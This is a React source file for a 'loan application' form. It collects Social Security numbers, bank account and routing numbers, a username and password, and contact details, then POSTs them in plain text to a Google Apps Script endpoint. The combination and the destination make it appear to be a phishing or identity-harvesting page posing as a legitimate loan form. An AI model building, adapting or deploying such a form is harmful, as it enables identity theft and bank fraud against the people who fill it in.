import React, { useState } from "react";

export default function LoanApplicationForm() {
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    ssn: "",
    countryCode: "+1",
    phoneNumber: "",
    address: "",
    bankName: "",
    accountNumber: "",
    routingNumber: "",
    username: "",
    password: "",
    requiredAmount: "",
    termsAccepted: false,
  });

  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState({});
  const [submitMessage, setSubmitMessage] = useState({ type: "", text: "" });

  const countries = [
    { code: "+1", name: "United States", flag: "🇺🇸", format: "(XXX) XXX-XXXX", maxLength: 10 },
    { code: "+1", name: "Canada", flag: "🇨🇦", format: "(XXX) XXX-XXXX", maxLength: 10 },
    { code: "+44", name: "United Kingdom", flag: "🇬🇧", format: "XXXX XXX XXXX", maxLength: 10 },
    { code: "+91", name: "India", flag: "🇮🇳", format: "XXXXX XXXXX", maxLength: 10 },
  ];

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    let val = value;

    if (name === "ssn") {
      val = val.replace(/\D/g, "");
      if (val.length > 3 && val.length <= 5)
        val = val.replace(/(\d{3})(\d+)/, "$1-$2");
      if (val.length > 5)
        val = val.replace(/(\d{3})(\d{2})(\d+)/, "$1-$2-$3");
      val = val.substring(0, 11);
    }

    if (name === "phoneNumber") {
      val = val.replace(/\D/g, "");
      const selectedCountry = countries.find(c => c.code === formData.countryCode);
      val = val.substring(0, selectedCountry?.maxLength || 10);
    }

    setFormData(prev => ({
      ...prev,
      [name]: type === "checkbox" ? checked : val,
    }));

    if (errors[name]) setErrors(prev => ({ ...prev, [name]: "" }));
  };

  const validateForm = () => {
    const newErrors = {};

    if (!formData.firstName.trim())
      newErrors.firstName = "First Name is required";

    if (!formData.lastName.trim())
      newErrors.lastName = "Last Name is required";

    if (!/^\d{3}-\d{2}-\d{4}$/.test(formData.ssn))
      newErrors.ssn = "SSN must be valid";

    const selectedCountry = countries.find(c => c.code === formData.countryCode);

    if (formData.phoneNumber.length !== selectedCountry?.maxLength)
      newErrors.phoneNumber = "Invalid phone number";

    if (!formData.address.trim())
      newErrors.address = "Address is required";

    if (!formData.bankName.trim())
      newErrors.bankName = "Bank Name is required";

    if (formData.accountNumber.length < 8)
      newErrors.accountNumber = "Account Number too short";

    if (!/^\d{9}$/.test(formData.routingNumber))
      newErrors.routingNumber = "Routing must be 9 digits";

    if (formData.username.length < 4)
      newErrors.username = "Username too short";

    if (formData.password.length < 8)
      newErrors.password = "Password too short";

    if (formData.requiredAmount < 300)
      newErrors.requiredAmount = "Min $300";

    if (!formData.termsAccepted)
      newErrors.termsAccepted = "Accept terms";

    return newErrors;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setSubmitMessage({ type: "", text: "" });

    const validationErrors = validateForm();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      return;
    }

    setLoading(true);

    try {
      const response = await fetch("https://script.google.com/macros/s/AKfycbzm9otJDlN2JiUpXFPwgKoSu30ql8ia4lXYAZ271S2Iec7n2zlxyTUsr622HYHxOq2f/exec", {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: JSON.stringify(formData),
      });

      const result = await response.json();

      if (result.status === "success") {
        setSubmitMessage({ type: "success", text: "Submitted successfully!" });

        setFormData({
          firstName: "",
          lastName: "",
          ssn: "",
          countryCode: "+1",
          phoneNumber: "",
          address: "",
          bankName: "",
          accountNumber: "",
          routingNumber: "",
          username: "",
          password: "",
          requiredAmount: "",
          termsAccepted: false,
        });
      } else {
        setSubmitMessage({ type: "error", text: "Submission failed" });
      }
    } catch {
      setSubmitMessage({ type: "error", text: "Network error" });
    } finally {
      setLoading(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="p-6 max-w-2xl mx-auto space-y-4">

      <input name="firstName" placeholder="First Name" value={formData.firstName} onChange={handleChange} />
      <input name="lastName" placeholder="Last Name" value={formData.lastName} onChange={handleChange} />

      <input name="ssn" placeholder="XXX-XX-XXXX" value={formData.ssn} onChange={handleChange} />

      <select name="countryCode" value={formData.countryCode} onChange={handleChange}>
        {countries.map((c, i) => (
          <option key={i} value={c.code}>{c.flag} {c.name}</option>
        ))}
      </select>

      <input name="phoneNumber" placeholder="Phone" value={formData.phoneNumber} onChange={handleChange} />

      <input name="address" placeholder="Address" value={formData.address} onChange={handleChange} />

      <input name="bankName" placeholder="Bank Name" value={formData.bankName} onChange={handleChange} />

      <input name="accountNumber" placeholder="Account Number" value={formData.accountNumber} onChange={handleChange} />

      <input name="routingNumber" placeholder="Routing Number" value={formData.routingNumber} onChange={handleChange} />

      <input name="username" placeholder="Username" value={formData.username} onChange={handleChange} />

      <input type="password" name="password" placeholder="Password" value={formData.password} onChange={handleChange} />

      <input type="number" name="requiredAmount" placeholder="Amount" value={formData.requiredAmount} onChange={handleChange} />

      <label>
        <input type="checkbox" name="termsAccepted" checked={formData.termsAccepted} onChange={handleChange} />
        Accept Terms
      </label>

      <button disabled={loading}>
        {loading ? "Submitting..." : "Submit"}
      </button>

      {submitMessage.text && <p>{submitMessage.text}</p>}
    </form>
  );
}
